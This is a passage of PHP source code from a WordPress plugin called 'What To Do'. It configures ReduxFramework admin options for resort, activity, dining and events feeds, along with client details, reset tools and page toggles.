                            $this->wtd_pages[$page_key]['args']['fields'][$key]['default'] = $nav[$field_id];
                        else
                            $this->wtd_pages[$page_key]['args']['fields'][$key]['default'] = 1;
                    }elseif(isset($field['default'])) {
                        if (!empty($nav[$field_id]))
                            $this->wtd_pages[$page_key]['args']['fields'][$key]['default'] = $nav[$field_id];
                        else
                            $this->wtd_pages[$page_key]['args']['fields'][$key]['default'] = 3;
                    }
                }
            }

            //$this->remove_demo();

            if ( ! class_exists( 'ReduxFramework' ) ) {
                return;
            }

            // This is needed. Bah WordPress bugs.  ;)
            add_action( 'init', array( $this, 'initSettings' ), 1000000 );


        }

        public function initSettings() {

            // Just for demo purposes. Not needed per say.
            $this->theme = wp_get_theme();

            $wtd_set = get_option('wtd_plugin');
            if (!empty($wtd_set['wtd_api_key']))
                $this->api_active = true;

            $wtd_redux_transient = get_option('wtd_plugin-transients');
            if(!empty($wtd_redux_transient['last_save'])) {
                $wtd_time_diff = time() - $wtd_redux_transient['last_save'];

                if ($wtd_time_diff > (60 * 60))
                    delete_option('wtd_plugin-transients');
            }

            // Set the default arguments
            $this->setArguments();

            // Set a few help tabs so you can see how it's done
            $this->setHelpTabs();

            if (!empty($wtd_set['wtd_resorts'])){
                $map_def = array();
                foreach ($wtd_set['wtd_resorts'] as $resort){
                    $map_def[$resort] = array(
                        'lat' => '38',
                        'lng' => '-95.677068'
                    );
                }
                $this->wtd_pages['map-page']['args']['fields'][0]['default'] = $map_def;
                //~ var_dump($this->wtd_pages['map-page']);
            }

            $wtd_pages = get_option('wtd_pages');
            foreach ($this->wtd_pages as $key => $value){
                if (!empty($wtd_set[$key])) {
                    $this->wtd_pages[$key]['enabled'] = 1;
                }
            }

            // Create the sections and fields
            add_filter('redux/options/'.$this->args['opt_name'].'/compiler', array( $this, 'compiler_action' ), 10, 3);

            //Register Resorts
            $labels = array();
            $args = array(
                'hierarchical'      => true,
                'labels'            => $labels,
                'show_ui'           => false,
                'show_in_menu'      => false,
                'show_admin_column' => false,
                'query_var'         => true,
                'rewrite'           => false,
                'public'        => true
            );

            register_taxonomy( 'wtd_resort', array( 'wtd_event','wtd_activity','wtd_coupon','wtd_special' ), $args );


            //Register Locations
            $labels = array();
            $args = array(
                'hierarchical'      => false,
                'labels'            => $labels,
                'show_ui'           => false,
                'show_in_menu'      => false,
                'show_admin_column' => false,
                'query_var'         => true,
                'rewrite'           => false,
                'public'        => true
            );

            register_taxonomy( 'wtd_location', array( 'wtd_event','wtd_activity','wtd_coupon','wtd_special' ), $args );

            $this->setSections();

            if ( ! isset( $this->args['opt_name'] ) ) { // No errors please
                return;
            }

            // If Redux is running as a plugin, this will remove the demo notice and links
            //add_action( 'redux/loaded', array( $this, 'remove_demo' ) );

            // Function to test the compiler hook and demo CSS output.
            // Above 10 is a priority, but 2 in necessary to include the dynamically generated CSS to be sent to the function.

            // Change the arguments after they've been declared, but before the panel is created
            //add_filter('redux/options/'.$this->args['opt_name'].'/args', array( $this, 'change_arguments' ) );

            // Change the default value of a field after it's been set, but before it's been useds
            //add_filter('redux/options/'.$this->args['opt_name'].'/defaults', array( $this,'change_defaults' ) );

            // Dynamically add a section. Can be also used to modify sections/fields
            //add_filter('redux/options/' . $this->args['opt_name'] . '/sections', array($this, 'dynamic_section'));

            $this->ReduxFramework = new ReduxFramework( $this->sections, $this->args );

        }

        /**
         * This is a test function that will let you see when the compiler hook occurs.
         * It only runs if a field    set with compiler=>true is changed.
         * */
        function compiler_action( $options, $css, $changed_values ) {

            global $wtd_main;
            global $wtd_connector;
            global $wpdb;
            global $wtd_syncing;
            global $wtd_modal;

            $synced = false;
            $wtd_feed = get_option('wtd_feed');
            $feed_updated = false;
            $flags = array(
                'activities-page',
                'dining-page',
                'map-page',
                'coupons-page',
                'calendar-page',
                'specials-page',
                'week-page'
            );

            $client_fields = array(
                'first_name',
                'last_name',
                'company',
                'company_address1',
                'company_country',
                'company_city',
                'company_state',
                'company_email',
                'company_zip',
                'company_phone',
                'primary_resort'
            );

            $nav_options = get_option('wtd_nav_options');
            $nav_fields = array(
                'act_page_type',
                'activities_sort_by',
                'act_page_mosaic',
                'calendar_type',
                'dining_page_type',
                'dining_sort_by',
                'map_page_type',
                'specials_type',
            );

            $syncing = get_option('wtd_syncing');
            $import = false;
            $client_check = false;
            $init_sync = $terms_synced = get_option('wtd_terms_synced');
            foreach ($changed_values as $key => $value){

                if (in_array($key,$nav_fields)){
                    if (!empty($nav_options))
                        $nav_options[$key] = $options[$key];
                    else
                        $nav_options = array(
                            $key => $options[$key]
                        );
                    update_option('wtd_nav_options',$nav_options);
                }

                if (in_array($key,$client_fields) && !$client_check){
                    $client_post = array();
                    foreach ($client_fields as $cf){
                        if (empty($options[$cf])){
                            $client_check = true;
                            break;
                        }else{
                            $client_post[$cf] = $options[$cf];
                        }
                    }

                    if (!$client_check){
                        $wtd_connector->new_client($client_post);
                        $client_check = true;
                    }
                }

                if ($key == 'business_category'){
                    echo '<style>body{display:none;}</style>';
                    $wtd_connector->get_type_categories($options[$key]);
                    echo '<script>window.location = "'.admin_url('admin.php?page=wtd_plugin_settings').'";</script>';
                }

                if ($key == 'wtd_resorts'){
                    $wtd_modal = 3;
                    $wtd_syncing = true;
                    $syncing = array('changed' => $changed_values,'options' => $options);
                    update_option('wtd_syncing',$syncing);

                }

//                if ($key == 'user_map'){
//                    $wtd_syncing = true;
//                    $syncing = array('changed' => $changed_values,'options' => $options);
//                    update_option('wtd_syncing',$syncing);
//
//                }

                //Syncing
                if (in_array($key,array('activities-page','map-page','search-page')) && intval($options[$key]) && empty($terms_synced[$key]) ){

                    if (empty($wtd_feed['activities'])){
                        $wtd_modal = 1;
                        $terms_synced[$key] = $key;
                        $wtd_syncing = true;
                        $syncing = array('changed' => $changed_values,'options' => $options);
                        update_option('wtd_syncing',$syncing);
                    }
                }

                if (in_array($key,array('dining-page')) && intval($options[$key]) && empty($terms_synced[$key]) ){
                    if (empty($wtd_feed['dining'])){
                        $wtd_modal = 1;
                        $terms_synced[$key] = $key;
                        $wtd_syncing = true;
                        $syncing = array('changed' => $changed_values,'options' => $options);
                        update_option('wtd_syncing',$syncing);
                    }
                }

                if ($key == 'coupons-page' && intval($options[$key]) && empty($terms_synced[$key])){
                    if (empty($wtd_feed['coupons'])){
                        $wtd_modal = 1;
                        $terms_synced[$key] = $key;
                        $wtd_syncing = true;
                        $syncing = array('changed' => $changed_values,'options' => $options);
                        update_option('wtd_syncing',$syncing);
                    }
                }

                if (in_array($key,array('calendar-page','week-page')) && intval($options[$key]) && empty($terms_synced[$key])){
                    if (empty($wtd_feed['events'])){
                        $wtd_modal = 1;
                        $terms_synced[$key] = $key;
                        $wtd_syncing = true;
                        $syncing = array('changed' => $changed_values,'options' => $options);
                        update_option('wtd_syncing',$syncing);
                    }
                }

                if ($key == 'specials-page' && intval($options[$key]) && empty($terms_synced[$key])){
                    if (empty($wtd_feed['specials'])){
                        $wtd_modal = 1;
                        $terms_synced[$key] = $key;
                        $wtd_syncing = true;
                        $syncing = array('changed' => $changed_values,'options' => $options);
                        update_option('wtd_syncing',$syncing);
                    }
                }


            }
            if (!empty($terms_synced) && ($init_sync != $terms_synced)){
                update_option('wtd_terms_synced',$terms_synced);
            }

        }

        /**
         * Custom function for filtering the sections array. Good for child themes to override or add to the sections.
         * Simply include this function in the child themes functions.php file.
         * NOTE: the defined constants for URLs, and directories will NOT be available at this point in a child theme,
         * so you must use get_template_directory_uri() if you want to use any of the built in icons
         * */
        function dynamic_section( $sections ) {
            //$sections = array();
            $sections[] = array(
                'title'  => __( 'Section via hook', 'wtd-admin' ),
                'desc'   => __( '<p class="description">This is a section created by adding a filter to the sections array. Can be used by child themes to add/remove sections from the options.</p>', 'wtd-admin' ),
                'icon'   => 'el-icon-paper-clip',
                // Leave this as a blank section, no options just some intro text set above.
                'fields' => array()
            );

            return $sections;
        }

        /**
         * Filter hook for filtering the args. Good for child themes to override or add to the args array. Can also be used in other functions.
         * */
        function change_arguments( $args ) {
            //$args['dev_mode'] = true;

            return $args;
        }

        /**
         * Filter hook for filtering the default value of any given field. Very useful in development mode.
         * */
        function change_defaults( $defaults ) {
            $defaults['str_replace'] = 'Testing filter hook!';

            return $defaults;
        }

        // Remove the demo link and the notice of integrated demo from the redux-framework plugin
        function remove_demo() {

            // Used to hide the demo mode link from the plugin page. Only used when Redux is a plugin.
            if ( class_exists( 'ReduxFrameworkPlugin' ) ) {
                remove_filter( 'plugin_row_meta', array(
                    ReduxFrameworkPlugin::instance(),
                    'plugin_metalinks'
                ), null, 2 );

                // Used to hide the activation notice informing users of the demo panel. Only used when Redux is a plugin.
                remove_action( 'admin_notices', array( ReduxFrameworkPlugin::instance(), 'admin_notices' ) );
            }
        }

        public function setSections() {
            global $wpdb;
            $opt = get_option('wtd_syncing');
            /**
             * Used within different fields. Simply examples. Search for ACTUAL DECLARATION for field examples
             * */
            // Background Patterns Reader
            $sample_patterns_path = ReduxFramework::$_dir . '../sample/patterns/';
            $sample_patterns_url  = ReduxFramework::$_url . '../sample/patterns/';
            $sample_patterns      = array();

            if ( is_dir( $sample_patterns_path ) ) :

                if ( $sample_patterns_dir = opendir( $sample_patterns_path ) ) :
                    $sample_patterns = array();

                    while ( ( $sample_patterns_file = readdir( $sample_patterns_dir ) ) !== false ) {

                        if ( stristr( $sample_patterns_file, '.png' ) !== false || stristr( $sample_patterns_file, '.jpg' ) !== false ) {
                            $name              = explode( '.', $sample_patterns_file );
                            $name              = str_replace( '.' . end( $name ), '', $sample_patterns_file );
                            $sample_patterns[] = array(
                                'alt' => $name,
                                'img' => $sample_patterns_url . $sample_patterns_file
                            );
                        }
                    }
                endif;
            endif;

            ob_start();

            $ct          = wp_get_theme();
            $this->theme = $ct;
            $item_name   = $this->theme->get( 'Name' );
            $tags        = $this->theme->Tags;
            $screenshot  = $this->theme->get_screenshot();
            $class       = $screenshot ? 'has-screenshot' : '';

            $customize_title = sprintf( __( 'Customize &#8220;%s&#8221;', 'wtd-admin' ), $this->theme->display( 'Name' ) );

            ?>
            <div id="current-theme" class="<?php echo esc_attr( $class ); ?>">
                <?php if ( $screenshot ) : ?>
                    <?php if ( current_user_can( 'edit_theme_options' ) ) : ?>
                        <a href="<?php echo wp_customize_url(); ?>" class="load-customize hide-if-no-customize"
                           title="<?php echo esc_attr( $customize_title ); ?>">
                            <img src="<?php echo esc_url( $screenshot ); ?>"
                                 alt="<?php esc_attr_e( 'Current theme preview', 'wtd-admin' ); ?>"/>
                        </a>
                    <?php endif; ?>
                    <img class="hide-if-customize" src="<?php echo esc_url( $screenshot ); ?>"
                         alt="<?php esc_attr_e( 'Current theme preview', 'wtd-admin' ); ?>"/>
                <?php endif; ?>

                <h4><?php echo $this->theme->display( 'Name' ); ?></h4>

                <div>
                    <ul class="theme-info">
                        <li><?php printf( __( 'By %s', 'wtd-admin' ), $this->theme->display( 'Author' ) ); ?></li>
                        <li><?php printf( __( 'Version %s', 'wtd-admin' ), $this->theme->display( 'Version' ) ); ?></li>
                        <li><?php echo '<strong>' . __( 'Tags', 'wtd-admin' ) . ':</strong> '; ?><?php printf( $this->theme->display( 'Tags' ) ); ?></li>
                    </ul>
                    <p class="theme-description"><?php echo $this->theme->display( 'Description' ); ?></p>
                    <?php
                    if ( $this->theme->parent() ) {
                        printf( ' <p class="howto">' . __( 'This <a href="%1$s">child theme</a> requires its parent theme, %2$s.', 'wtd-admin' ) . '</p>', __( 'http://codex.wordpress.org/Child_Themes', 'wtd-admin' ), $this->theme->parent()->display( 'Name' ) );
                    }
                    ?>

                </div>
            </div>

            <?php
            $item_info = ob_get_contents();

            ob_end_clean();

            $sampleHTML = '';
            if ( file_exists( dirname( __FILE__ ) . '/info-html.html' ) ) {
                Redux_Functions::initWpFilesystem();

                global $wp_filesystem;

                $sampleHTML = $wp_filesystem->get_contents( dirname( __FILE__ ) . '/info-html.html' );
            }


            // ACTUAL DECLARATION OF SECTIONS
            $reseting = get_option('wtd_reseting');


            $res_query = get_terms('wtd_resort',array('hide_empty' => false,'orderby' => 'name','order'=>'ASC'));
            if ((count($res_query) && !is_wp_error($res_query)) || $reseting){
                $resorts = array();
                foreach ($res_query as $r){
                    $resorts[$r->term_id] = $r->name;
                }
                $this->sections[] = array(
                    'title'  => __(  'General Settings', 'wtd-admin' ),
                    'desc'   => '<link rel="stylesheet" href="'.WTD_PLUGIN_URL.'assets/css/wtd_redux.css?wtd_version='.WTD_VERSION.'"/><script src="'.WTD_PLUGIN_URL.'assets/js/wtd_redux.js?wtd_version='.WTD_VERSION.'"></script>',
                    'icon'   => 'el-icon-cogs',
                    'submenu' => false,
                    'fields' => array(
                        array(
                            'id' => 'wtd_api_error',
                            'type' => 'info',
                            'title' => 'API connection error!',
                            'icon' => 'el-icon-error-alt',
                            'desc' => '<ul id="wtd_api_errors"></ul>',
                            'style' => 'critical'
                        ),
                        array(
                            'id'       => 'hidden-pages',
                            'type'     => 'callback',
                            'callback' => 'wtd_hidden_pages',
                            'title' => 'Hidden<span class="resort_flag"></span>'
                        )
                    )
                );

                $count = count($this->sections);
                $cur = $count - 1;

                if(!$reseting){
                    $this->sections[$cur]['fields'][] = array(
                        'id'       => 'wtd_resorts',
                        'type'     => 'select',
                        'title' 	 => 'Resorts',
                        'multi' 	 => true,
                        // Must provide key => value pairs for select options
                        'options'  => $resorts,
                        'compiler' => true,
                        'default' => 0
                    );
                }else{
                    $this->sections[$cur]['fields'][] = array(
                        'id' => 'wtd_reseting',
                        'type' => 'info',
                        'title' => 'Alert',
                        'icon' => 'el-icon-error-alt',
                        'desc' => 'Currently Erasing WTD data, please wait!',
                        'style' => 'critical'
                    );
                }

                //Client Details
                $wtd_client_details = get_option('wtd_client_details');
                $this->sections[$cur]['fields'][] = array(
                    'id' => 'client_details',
                    'type'     => 'callback',
                    'title'    => 'Client Details',
                    'subtitle' => '<a href="'.admin_url('/admin.php?page=wtd_plugin_settings&wtd_refresh_details=1&wtd_new_client_key='.$wtd_client_details['api_key']).'" class="button"><i class="el-icon-refresh"></i>&nbsp;&nbsp;&nbsp;Refresh Client Details</a>',
                    'callback' => 'wtd_client_details'
                );
                if (!$reseting){

                    $this->sections[] = array(
                        'title'  => __(  'Advanced', 'wtd-admin' ),
                        'subsection' => true,
                        'fields' => array(
                        )
                    );

                    $count = count($this->sections);
                    $cur = $count - 1;

                    $this->sections[$cur]['fields'][] = array(
                        'id' => 'wtd_change_api',
                        'type' => 'info',
                        'style' => 'info',
                        'title' => '<a href="javascript:void(0);" class="button button-primary wtd_key_changer">Change Client Key</a>',
                        'desc' => '<span style="margin-top:20px;float:left;"><b>Note:</b> In event that you need to utilize a different Client Key with this site then use this feature.  Doing so may change the data that is displayed on your site, for example, if the new Client Key has access to different resorts than the one your are currently using.</span>'
                    );
                    $this->sections[$cur]['fields'][] = array(
                        'id' => 'wtd_delete_data',
                        'type' => 'info',
                        'style' => 'info',
                        'title' => '<a href="' . admin_url('admin.php?page=wtd_plugin_settings&wtd_pre_reset=1') . '" class="button button-primary wtd_reseter">Reload All WTD Imported Data</a>',
                        'desc' => '<span style="margin-top:20px;float:left;"><b>Note:</b>  This feature will delete all What To Do data from your site and import a fresh copy of it. You will rarely, if ever, need to do this. Only use this feature if you are having issues with the data not displaying correctly or expect different data to be displayed than you are seeing. What To Do automatically updates your data by only importing changes and additions, keeping bandwidth usage and processor utilization low, so this feature is typically not used. Using it will not affect the layout or design of any of your What To Do Pages.</span>'
                    );
                    $this->sections[$cur]['fields'][] = array(
                        'id' => 'wtd_hard_reset',
                        'type' => 'info',
                        'style' => 'info',
                        'title' => '<a href="' . admin_url('admin.php?page=wtd_plugin_settings&wtd_pre_reset=2') . '" class="button button-primary wtd_hard_reseter">Hard Reset WTD Plug-in</a>',
                        'desc' => '<span style="margin-top:20px;float:left;"><b>Note:</b>  Only use this feature if you are requested to by What To Do technical support or your website manager. This feature will reset your entire What To Do plugin, including deleting all What To Do pages, data and your feed settings. The plugin will remain installed but will revert to a brand new installation, ready to be set up again.</span>'
                    );
                    $this->sections[$cur]['fields'][] = array(
                        'id' => 'feed_update_time',
                        'type' => 'text',
                        'title' => 'Refresh rate',
                        'desc' => 'The Refesh Rate sets the number of minutes between refeshing the What To Do data being displayed on your site form the What To Do servers.  Setting this number to anything below 60 may cause excessive server and bandwidth load and lead to a loss of performance on your site.',
                        "default" => 60
                    );
                    $this->sections[$cur]['fields'][] = array(
                        'id' => 'url_prefix',
                        'type' => 'text',
                        'title' => 'URL Prefix',
                        'desc' => 'The URL Prefix is the set of characters that is present in the URL for every WTD page. Changing this value may interfere with other posts, pages or plug-ins causing the pages generated by this plug-in to break. Only use this feature if you are fully aware of its purpose or a WTD team member asks you to do that.',
                        "default" => 'wtd'
                    );
                    $this->sections[$cur]['fields'][] = array(
                        'id' => 'cat_url_prefix',
                        'type' => 'text',
                        'title' => 'Category URL Prefix',
                        'desc' => 'The Category URL Prefix is the set of characters that is present in the URL for every WTD details page of the items that have only one category. Changing this value may interfere with other posts, pages or plug-ins causing the pages generated by this plug-in to break. Only use this feature if you are fully aware of its purpose or a WTD team member asks you to do that.',
                        "default" => 'wtdc'
                    );
                    $this->sections[$cur]['fields'][] = array(
                        'id' => 'scat_url_prefix',
                        'type' => 'text',
                        'title' => 'Sub-Category URL Prefix',
                        'desc' => 'The Sub-Category URL Prefix is the set of characters that is present in the URL for every WTD details page of the items that have two categories. Changing this value may interfere with other posts, pages or plug-ins causing the pages generated by this plug-in to break. Only use this feature if you are fully aware of its purpose or a WTD team member asks you to do that.',
                        "default" => 'wtds'
                    );
                }

                $vend_args = array(
                    'posts_per_page' => -1,
                    'post_type' => 'wtd_aprovider',
                    'orderby' => 'title',
                    'order' => 'ASC'
                );
                $vend_query = new WP_Query($vend_args);

                if ($vend_query->found_posts && count($res_query) && !$opt && !$reseting){
                    $vendors = array();
                    foreach ($vend_query->posts as $vendor)
                        $vendors[$vendor->ID] = $vendor->post_title;

                    $loc_terms = get_terms('wtd_location',array('hide_empty' => false,'orderby' => 'name','order'=>'ASC'));
                    $locations = array();
                    foreach ($loc_terms as $loc)
                        $locations[$loc->term_id] = $loc->name;

                    $area_cats = array(
                        'All Categories' => 'All Categories',
                        'Activity Provider' => 'Activity Provider',
                        'Concierge' => 'Concierge',
                        'Event Calendar' => 'Event Calendar',
                        'Hotel-Motel' => 'Hotel-Motel',
                        'Information Booth' => 'Information Booth',
                        'Property Management' => 'Property Management',
                        'Private Vacation Rental' => 'Private Vacation Rental',
                        'Real Estate' => 'Real Estate',
                        'Restaurant' => 'Restaurant',
                        'Wedding' => 'Wedding'
                    );
                    $this->sections[] = array(
                        'title'  => __(  'Feed Settings', 'wtd-admin' ),
                        'icon'   => 'el-icon-filter',
                        'submenu' => false,
                        'class' => 'feed_settings',
                        'fields' => array(
                            array(
                                'id' => 'business_category',
                                'type' => 'select',
                                'title' => 'Select your website type',
                                'subtitle' => 'Select the website type that is closest to your type of business to receive suggestions on optimal feed setup.',
                                'desc' => 'Please save the settings after changing this option',
                                'multi' => false,
                                'options' => $area_cats,
                                'default' => 'All Categories',
                                'compiler' => true
                            )
                        )
                    );
                    $this->sections[] = array(
                        'title'  => __(  'Physical Address', 'wtd-admin' ),
                        'icon'   => 'el-icon-briefcase',
                        'class' => 'wtd_physical_address',
                        'subsection' => true,
                        'fields' => array(
                            array(
                                'id' => 'address',
                                'type'     => 'text',
                                'title'    => 'Street'
                            ),
                            array(
                                'id' => 'city',
                                'type'     => 'text',
                                'title'    => 'City'
                            ),
                            array(
                                'id' => 'state',
                                'type'     => 'text',
                                'title'    => 'State',
                                'desc'		 => 'State code (e.g. CO)'
                            ),
                            array(
                                'id' => 'zip',
                                'type'     => 'text',
                                'title'    => 'Zip Code',
                                'validate' => 'numeric'
                            ),
                            array(
                                'id' => 'user_map',
                                'type'     => 'callback',
                                'title'    => 'Map Position',
                                'callback' => 'wtd_user_map',
                                'default' => array('lat' => '38', 'lng' => '-95.677068'),
                                'compiler' => true
                            )
                        )
                    );


                    $this->sections[] = array(
                        'title'  => __(  'Activity Providers', 'wtd-admin' ),
                        'icon'   => 'el-icon-list',
                        'subsection' => true,
                        'fields' => array(
                            array(
                                'id' => 'activity_providers',
                                'type'     => 'button_set',
                                'title'    => 'Activity Providers',
                                //Must provide key => value pairs for options
                                'options' => array(
                                    '1' => 'Default',
                                    '2' => 'Exclude Certain Activity Providers',
                                    '3' => 'Include Certain Activity Providers'
                                ),
                                'default' => '1'
                            ),
                            array(
                                'id' => 'excluded_vendors',
                                'type' => 'select',
                                'title' => 'Exclude the following activity providers',
                                'multi' => true,
                                'options' => $vendors,
                                'class' => 'exclude_vendors'
                            ),
                            array(
                                'id' => 'vendors',
                                'type' => 'select',
                                'title' => 'Include only the activities provided by the following activity providers',
                                'multi' => true,
                                'options' => $vendors,
                                'class' => 'include_vendors'
                            )
                        )
                    );

                    $this->sections[] = array(
                        'title'  => __(  'Locations', 'wtd-admin' ),
                        'icon'   => 'el-icon-map-marker-alt',
                        'subsection' => true,
                        'fields' => array(
                            array(
                                'id' => 'excluded_locations',
                                'type' => 'select',
                                'title' => 'Exclude the following Locations',
                                'multi' => true,
                                'options' => $locations
                            )
                        )
                    );

                    $this->sections[] = array(
                        'title'  => __(  'Categories', 'wtd-admin' ),
                        'icon'   => 'el-icon-bookmark',
                        'subsection' => true,
                        'fields' => array(
                            array(
                                'id'       => 'business_categories',
                                'type'     => 'callback',
                                'title'    => 'Categories<span data-place="business_categories_options"></span>',
                                'subtitle' => 'This will filter the imported data based on the enabled categories',
                                'callback' => 'wtd_bus_options',
                                'compiler' => true
                            ),
                            array(
                                'id'       => 'business_categories_options',
                                'type'     => 'callback',
                                'title'    => 'Options<span class="options_wtd_flag" data-place="business_categories_options">&nbsp</span>',
                                'callback' => 'wtd_bus_temp',
                                'compiler' => true
                            )
                        )
                    );

                    $this->sections[] = array(
                        'title'  => __(  'WTD Pages', 'wtd-admin' ),
                        'desc'   => __( 'What To Do Pages', 'wtd-admin' ),
                        'desc' => __( 'Enabling a page for the first time will automatically import necesary data from WTD database.<br/>You can always edit the page options if it is enabled.', 'wtd-admin' ),
                        'icon'   => 'el-icon-website',
                        'class' => 'wtd_pages',
                        'submenu' => false,
                        'fields' => array(

                            array(
                                'id'       => 'activities-page',
                                'type'     => 'switch',
                                'title'    => __( 'Activities', 'wtd-admin' ),
                                'on' => 'Enable',
                                'off' => 'Disable',
                                'compiler' => true,
                                'default' => 0

                            ),
                            array(
                                'id'       => 'calendar-page',
                                'type'     => 'switch',
                                'title'    => __( 'Events Calendar', 'wtd-admin' ),
                                'on' => 'Enable',
                                'off' => 'Disable',
                                'default' => 0

                            ),
                            array(
                                'id'       => 'week-page',
                                'type'     => 'switch',
                                'title'    => __( 'Weekly Events Calendar', 'wtd-admin' ),
                                'on' => 'Enable',
                                'off' => 'Disable',
                                'default' => 0

                            ),
                            array(
                                'id'       => 'dining-page',
                                'type'     => 'switch',
                                'title'    => __( 'Dining', 'wtd-admin' ),
                                'on' => 'Enable',
                                'off' => 'Disable',
                                'compiler' => true,
                                'default' => 0

                            ),
//                                array(
//                                    'id'       => 'map-page',
//                                    'type'     => 'switch',
//                                    'title'    => __( 'Activities Map', 'wtd-admin' ),
//                                    'on' => 'Enable',
//                                    'off' => 'Disable',
//                                    'compiler' => true,
//                                    'default' => 0
//
//                                ),
                            array(
                                'id'       => 'coupons-page',
                                'type'     => 'switch',
                                'title'    => __( 'Coupons', 'wtd-admin' ),
                                'on' => 'Enable',
                                'off' => 'Disable',
                                'compiler' => true,
                                'default' => 0

                            ),
                            array(
                                'id'       => 'specials-page',
                                'type'     => 'switch',
                                'title'    => __( 'Specials', 'wtd-admin' ),
                                'on' => 'Enable',
                                'off' => 'Disable',
                                'default' => 0

                            ),
                            array(
                                'id'       => 'week-specials-page',
                                'type'     => 'switch',
                                'title'    => __( 'Weekly Specials Calendar', 'wtd-admin' ),
                                'on' => 'Enable',
                                'off' => 'Disable',
                                'default' => 0

                            ),
                            array(
                                'id'       => 'search-page',
                                'type'     => 'switch',
                                'title'    => __( 'Search', 'wtd-admin' ),
                                'on' => 'Enable',
                                'off' => 'Disable',
                                'compiler' => true,
                                'default' => 0

                            )

                        )
                    );

                    foreach ($this->wtd_pages as $key => $page){
                        if (is_admin())
                            wtd_page_check($key);
                        if (!empty($page['enabled']) && $key != 'map-page' && empty($page['is_not_section']))
                            $this->sections[] = $page['args'];
                    }

                    $this->sections[] = array(
                        'title'  => __(  'Styling Options', 'wtd-admin' ),
                        'icon'   => 'el-icon-brush',
                        'submenu' => false,
                        'class' => 'wtd_general_style',
                        'fields' => array(
                            array(
                                'id'       => 'wtd_copyright_holder',
                                'type'     => 'button_set',
                                'title'    => 'What To Do Copyright',
                                'options'  => array(
                                    1 => 'Big',
                                    0 => 'Small'
                                ),
                                'default'  => 1
                            ),
                           /* array(
                                'id'       => 'wtd_booking_button',
                                'type'     => 'button_set',
                                'title'    => '"Book Now" Button',
                                'options'  => array(
                                    1 => 'Enable',
                                    0 => 'Disable'
                                ),
                                'default'  => 0
                            )*/
                        )
                    );

//                    $this->sections[] = array(
//                        'title'  => __(  'Full Menu', 'wtd-admin' ),
//                        'icon'   => 'el-icon-th-large',
//                        'class' => 'wtd_typograpy_panel big_menu',
//                        'subsection' => true,
//                        'fields' => array(
//                            array(
//                                'id'       => 'fm_parent_menu',
//                                'type'     => 'typography',
//                                'font-family' => false,
//                                'font-backup' => false,
//                                'line-height' => false,
//                                'text-align' => false,
//                                'font-subsets' => false,
//                                'font-size' => false,
//                                'google' => false,
//                                'units'       =>'px',
//                                'default'     => array(
//                                    'color'       => '#7A644D',
//                                    'font-style'  => '700',
//                                    'font-size'   => '18px',
//                                    'google' => false
//                                )
//
//                            ),
//                            array(
//                                'id'       => 'fm_parent_menu_active',
//                                'type'     => 'typography',
//                                'font-backup' => false,
//                                'font-family' => false,
//                                'font-substes' => false,
//                                'line-height' => false,
//                                'text-align' => false,
//                                'font-subsets' => false,
//                                'google' => false,
//                                'units'       =>'px',
//                                'default'     => array(
//                                    'color'       => '#2E2D2D',
//                                    'font-style'  => '400',
//                                    'font-size'   => '18px',
//                                    'google' => false
//                                )
//
//                            ),
//                            array(
//                                'id'       => 'fm_child_menu_background',
//                                'type'     => 'typography',
//                                'font-backup' => false,
//                                'font-family' => false,
//                                'font-substes' => false,
//                                'line-height' => false,
//                                'text-align' => false,
//                                'font-subsets' => false,
//                                'font-style' => false,
//                                'font-size' => false,
//                                'font-weight' => false,
//                                'units'       =>'px',
//                                'default'     => array(
//                                    'color'       => '#eaeaea'
//                                )
//
//                            ),
//                            array(
//                                'id'       => 'fm_child_menu',
//                                'type'     => 'typography',
//                                'font-family' => false,
//                                'font-backup' => true,
//                                'line-height' => false,
//                                'text-align' => false,
//                                'font-subsets' => false,
//                                'google' => false,
//                                'units'       =>'px',
//                                'subtitle'    => 'Child Menu',
//                                'default'     => array(
//                                    'color'       => '#7A644D',
//                                    'font-style'  => '400',
//                                    'font-size'   => '15px',
//                                    'google' => false
//                                )
//
//                            ),
//                            array(
//                                'id'       => 'fm_child_menu_active',
//                                'type'     => 'typography',
//                                'font-backup' => false,
//                                'font-family' => false,
//                                'font-substes' => false,
//                                'line-height' => false,
//                                'text-align' => false,
//                                'google' => false,
//                                'font-subsets' => false,
//                                'units'       =>'px',
//                                'subtitle'    => 'Parent Menu',
//                                'default'     => array(
//                                    'color'       => '#8a8a8a',
//                                    'font-style'  => '400',
//                                    'font-size'   => '15px',
//                                    'google' => false
//                                )
//
//                            ),
//                            array(
//                                'id'       => 'full_menu_hidden',
//                                'type'     => 'callback',
//                                'callback' => 'wtd_full_menu'
//                            )
//                        )
//                    );
                }
            }else{
                $this->sections[] = array(
                    'title'  => __(  'Setup', 'wtd-admin' ),
                    'desc'   => '<link rel="stylesheet" href="'.WTD_PLUGIN_URL.'assets/css/wtd_redux.css"/><script src="'.WTD_PLUGIN_URL.'assets/js/wtd_redux.js"></script>',
                    'icon'   => 'el-icon-cog',
                    'class'  => 'wtd_setup_page',
                    'submenu' => false,
                    'fields' => array(
                        array(
                            'id'       => 'setup-page',
                            'type'     => 'callback',
                            'callback' => 'wtd_setup_page',
                            'title' => 'Options'
                        )
                    )
                );
                $resorts_active = json_decode(file_get_contents(WTD_API_URL.'get_resorts'));
                $this->sections[] = array(
                    'title'  => __(  'Client Information', 'wtd-admin' ),
                    'icon'   => 'el-icon-address-book',
                    'subsection' => true,
                    'class'  => 'client_information',
                    'fields' => array(
                        array(
                            'id' => 'first_name',
                            'type'     => 'text',
                            'title'    => 'First Name',
                            'validate' => 'not_empty',
                            'compiler' => true
                        ),
                        array(
                            'id' => 'last_name',
                            'type'     => 'text',
                            'title'    => 'Last Name',
                            'validate' => 'not_empty',
                            'compiler' => true
                        ),
                        array(
                            'id' => 'company',
                            'type'     => 'text',
                            'title'    => 'Company Name',
                            'validate' => 'not_empty',
                            'compiler' => true
                        ),
                        array(
                            'id' => 'company_address1',
                            'type'     => 'text',
                            'title'    => 'Address Line 1',
                            'validate' => 'not_empty',
                            'compiler' => true
                        ),
                        array(
                            'id' => 'company_address2',
                            'type'     => 'text',
                            'title'    => 'Address Line 2'
                        ),
                        array(
                            'id' => 'company_country',
                            'type'     => 'text',
                            'title'    => 'Country',
                            'validate' => 'not_empty',
                            'compiler' => true
                        ),
                        array(
                            'id' => 'company_city',
                            'type'     => 'text',
                            'title'    => 'City',
                            'validate' => 'not_empty',
                            'compiler' => true
                        ),
                        array(
                            'id' => 'company_state',
                            'type'     => 'text',
                            'title'    => 'State',
                            'placeholder' => 'State abbreviation (e.g. CO, CA)',
                            'validate' => 'not_empty',
                            'compiler' => true
                        ),
